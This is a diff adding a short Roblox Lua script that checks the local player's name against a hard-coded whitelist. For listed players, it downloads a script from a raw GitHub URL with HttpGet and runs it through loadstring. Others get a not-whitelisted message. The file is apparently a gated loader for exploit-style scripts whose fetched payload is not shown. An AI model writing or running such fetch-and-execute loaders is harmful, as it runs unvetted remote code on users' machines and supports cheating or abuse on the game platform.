@@ -1,0 +1,21 @@
+local whitelist = {
+    "jjophyzheng",
+    "jophyzheng",
+    "ujngjkty"
+}
+
+local function isWhitelisted(playerName)
+    for _, name in ipairs(whitelist) do
+        if playerName == name then
+            return true
+        end
+    end
+    return false
+end
+
+local playerName = game.Players.LocalPlayer.Name
+if isWhitelisted(playerName) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eyu1111/door-/refs/heads/main/%E5%AE%8732911165933"))()
+else
+    print("You are not whitelisted to use this script.")
+end
